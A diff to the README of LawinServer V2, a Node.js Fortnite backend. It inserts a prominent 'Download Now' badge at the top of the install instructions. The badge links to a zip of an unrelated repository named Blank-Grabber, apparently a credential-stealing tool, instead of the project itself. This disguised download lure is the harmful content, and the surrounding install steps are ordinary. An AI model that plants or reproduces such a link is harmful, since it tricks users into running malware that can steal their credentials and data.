@@ -60,6 +60,9 @@ LawinServer V2 is a fortnite backend written in Node.js that features an account
 You are allowed to host for others, however please credit [me](https://github.com/Lawin0129) and don't remove my credits from `responses/contentpages.json`.
 
 # Install
+
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
+
 1) Install [NodeJS](https://nodejs.org/en/) and [MongoDB Community (with Compass)](https://www.mongodb.com/try/download/community).
 2) Download and Extract LawinServerV2 to a safe location. (eg. a folder on an external drive or on your hard drive)
 3) Run "install_packages.bat" to install all the required modules.
